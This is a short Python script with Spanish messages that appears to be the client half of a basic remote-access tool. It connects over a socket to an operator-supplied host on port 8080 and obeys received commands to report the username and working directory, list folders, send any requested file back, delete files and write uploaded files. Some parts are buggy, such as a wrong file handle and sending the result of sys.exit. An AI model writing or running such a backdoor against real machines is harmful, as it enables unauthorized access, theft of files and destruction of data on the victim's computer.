import os
import socket
import getpass, sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 8080
host = input(str("Direccion del servidor: "))
s.connect((host, port))
print("")
print("Conexion llevada con exito")
print("")

#conexion completada

#comando para recibir y ejecutar

while True:
    comando = s.recv(1024)
    comando = comando.decode()
    print("Comando recibido")
    print("")
    if comando == "username":
        username = getpass.getuser()
        s.send(username.encode())
    elif comando == "view_cmd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Comando a sido ejecutado de manera exitosa")
        
    elif comando == "change_dir":
        change_dir = s.recv(5000)
        change_dir = change_dir.decode()
        path = os.chdir(change_dir)
        files = os.listdir(path)
        path = str(path)
        files = str(files)
        s.send(path.encode())
        s.send(files.encode())
        print("")
        print("Comando a sido ejecutado exitosamente")
        print("")

    elif comando == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("Archivo a sido enviado exitosamente")
        print("")

    elif comando == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Comando ejecutado con exito")
        print("")

    elif comando == "send_files":
        filename = s.recv(6000)
        print(filename)
        new_file = open(filename, "wb")
        data = s.recv(6000) #cambiar cuando el archivo es grande
        print(data)
        new_file.write(data)
        file.close()

    elif comando == "exit":
        salir = sys.exit(0)
        s.send(salir.encode())
        print("")
        print("Ejecucion terminada...")
        print("")

    else:
        print("")
        print("Comando no reconocido")

"""
lo que alguna vez fue codigo original
    elif comando == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Comando a sido ejecutado exitosamente")
        print("")
    """
